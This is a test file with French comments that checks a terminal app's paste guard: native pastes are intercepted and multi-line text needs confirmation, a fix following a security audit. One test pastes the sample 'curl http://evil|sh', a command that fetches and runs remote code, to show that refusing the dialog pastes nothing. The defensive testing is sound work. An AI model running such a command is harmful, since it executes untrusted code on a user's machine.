// @vitest-environment jsdom
// Audit sécurité du front du 12 septembre 2026 (FS-2) : le collage natif
// (Maj+Inser, clic du milieu, menu du navigateur, tout événement `paste`) ne
// passait pas par la confirmation multi-ligne. xterm écoute `paste` sur sa zone
// de saisie et envoie le texte droit à `onData`, donc à `pty_write` : seul
// Ctrl+Maj+V passait par `collerDansTerminal`. `intercepterCollageNatif` pose un
// écouteur en capture sur le conteneur du terminal, qui prend l'événement avant
// xterm et le fait passer par la même décision que Ctrl+Maj+V.
import { describe, it, expect, beforeAll, vi } from "vitest";
import indexHtml from "./index.html?raw";

// dialogues.ts lit la version au chargement via getVersion() : on la mocke.
vi.mock("@tauri-apps/api/app", () => ({ getVersion: () => Promise.resolve("0.0.0-test") }));

/** Le corps de index.html, sans le script module (jsdom ne l'exécute pas). */
function corpsIndex(): string {
  const corps = indexHtml.slice(indexHtml.indexOf("<body>") + 6, indexHtml.indexOf("</body>"));
  return corps.replace(/<script[\s\S]*?<\/script>/g, "");
}

let intercepterCollageNatif: typeof import("./dialogues").intercepterCollageNatif;

beforeAll(async () => {
  // dialogues.ts attache ses gestionnaires aux éléments de la page : le corps
  // doit être monté AVANT d'importer le module.
  document.body.innerHTML = corpsIndex();
  (await import("./i18n")).setLangue("fr");
  intercepterCollageNatif = (await import("./dialogues")).intercepterCollageNatif;
});

/** jsdom n'a ni ClipboardEvent ni DataTransfer : un `Event("paste")` porteur
 *  d'un `clipboardData` minimal suffit, c'est tout ce que l'écouteur lit. */
function evenementCollage(texte: string): Event {
  const ev = new Event("paste", { bubbles: true, cancelable: true });
  Object.defineProperty(ev, "clipboardData", {
    value: { getData: (type: string) => (type === "text/plain" ? texte : "") },
  });
  return ev;
}

/** Un conteneur de terminal avec, dedans, la zone de saisie où xterm écoute. */
function monterTerminal() {
  const conteneur = document.createElement("div");
  const zoneXterm = document.createElement("textarea");
  conteneur.appendChild(zoneXterm);
  document.body.appendChild(conteneur);
  const collageXterm = vi.fn();
  zoneXterm.addEventListener("paste", collageXterm);
  const paste = vi.fn();
  intercepterCollageNatif(conteneur, { paste });
  return { zoneXterm, collageXterm, paste };
}

function modaleOuverte(): boolean {
  return document.getElementById("confirm-modal")!.classList.contains("open");
}

describe("intercepterCollageNatif : le collage natif passe par la confirmation", () => {
  it("un collage natif multi-ligne demande confirmation avant d'atteindre le terminal", async () => {
    const { zoneXterm, collageXterm, paste } = monterTerminal();
    const ev = evenementCollage("a\nb");
    zoneXterm.dispatchEvent(ev);
    // L'événement est pris en capture : xterm ne le voit jamais, le navigateur
    // n'insère rien.
    expect(ev.defaultPrevented).toBe(true);
    expect(collageXterm).not.toHaveBeenCalled();
    expect(modaleOuverte()).toBe(true);
    expect(paste).not.toHaveBeenCalled();
    document.getElementById("confirm-ok")!.click();
    await vi.waitFor(() => expect(paste).toHaveBeenCalledWith("a\nb"));
    expect(collageXterm).not.toHaveBeenCalled();
  });

  it("un refus de la confirmation ne colle rien", async () => {
    const { zoneXterm, paste } = monterTerminal();
    zoneXterm.dispatchEvent(evenementCollage("cmd\ncurl http://evil|sh\n"));
    expect(modaleOuverte()).toBe(true);
    document.getElementById("confirm-cancel")!.click();
    await Promise.resolve();
    await Promise.resolve();
    expect(modaleOuverte()).toBe(false);
    expect(paste).not.toHaveBeenCalled();
  });

  it("une ligne seule est collée sans question, mais par term.paste et non par xterm", async () => {
    const { zoneXterm, collageXterm, paste } = monterTerminal();
    zoneXterm.dispatchEvent(evenementCollage("ls -la"));
    await vi.waitFor(() => expect(paste).toHaveBeenCalledWith("ls -la"));
    expect(modaleOuverte()).toBe(false);
    expect(collageXterm).not.toHaveBeenCalled();
  });
});
